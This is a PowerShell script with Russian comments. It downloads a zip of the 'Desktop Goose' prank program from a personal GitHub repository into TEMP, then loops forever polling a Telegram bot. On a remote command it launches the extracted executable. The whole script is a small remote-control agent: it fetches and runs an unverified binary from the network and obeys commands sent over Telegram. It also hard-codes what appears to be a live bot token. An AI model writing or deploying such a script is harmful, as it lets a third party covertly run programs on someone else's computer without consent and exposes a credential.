$TOKEN = "7946189167:AAFCUH2Nkpvx8VD2l4K7AXfi7D7t0Pl2RLQ"
$ZipUrl = "https://github.com/imherejnab/test-goose/raw/refs/heads/main/Desktop%20Goose%20v0.31.zip"
$ZipPath = "$env:TEMP\g.zip"
$ExtractPath = "$env:TEMP\g"

# 1. Скачиваем и распаковываем гуся (если еще не скачан)
if (-not (Test-Path $ExtractPath)) {
    Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipPath
    Expand-Archive -Path $ZipPath -DestinationPath $ExtractPath -Force
    Remove-Item -Path $ZipPath -Force -ErrorAction SilentlyContinue
}

# 2. Бесконечный цикл ожидания команды из Telegram
$offset = 0
while ($true) {
    try {
        $res = Invoke-RestMethod -Uri "https://api.telegram.org/bot$TOKEN/getUpdates?offset=$offset&timeout=10"
        foreach ($u in $res.result) {
            $offset = $u.update_id + 1
            $chatId = $u.message.chat.id
            $text = $u.message.text

            if ($text -eq "/start") {
                $json = @{
                    chat_id = $chatId
                    text = "Управление гусем готово!"
                    reply_markup = @{
                        keyboard = @(@("🦆 Запустить Гуся"))
                        resize_keyboard = $true
                    }
                } | ConvertTo-Json -Depth 3 -Compress

                Invoke-RestMethod -Uri "https://api.telegram.org/bot$TOKEN/sendMessage" -Method Post -ContentType "application/json; charset=utf-8" -Body ([System.Text.Encoding]::UTF8.GetBytes($json))
            }
            elseif ($text -eq "🦆 Запустить Гуся") {
                $exe = (Get-ChildItem -Path $ExtractPath -Recurse -Filter "Goose Desktop.exe" -ErrorAction SilentlyContinue | Select-Object -First 1).FullName
                if ($exe) {
                    Start-Process -FilePath $exe
                    $reply = "✅ Гусь выпущен на рабочий стол!"
                } else {
                    $reply = "❌ Ошибка: файл не найден."
                }
                $json = @{ chat_id = $chatId; text = $reply } | ConvertTo-Json -Compress
                Invoke-RestMethod -Uri "https://api.telegram.org/bot$TOKEN/sendMessage" -Method Post -ContentType "application/json; charset=utf-8" -Body ([System.Text.Encoding]::UTF8.GetBytes($json))
            }
        }
    } catch {
        Start-Sleep -Seconds 2
    }
}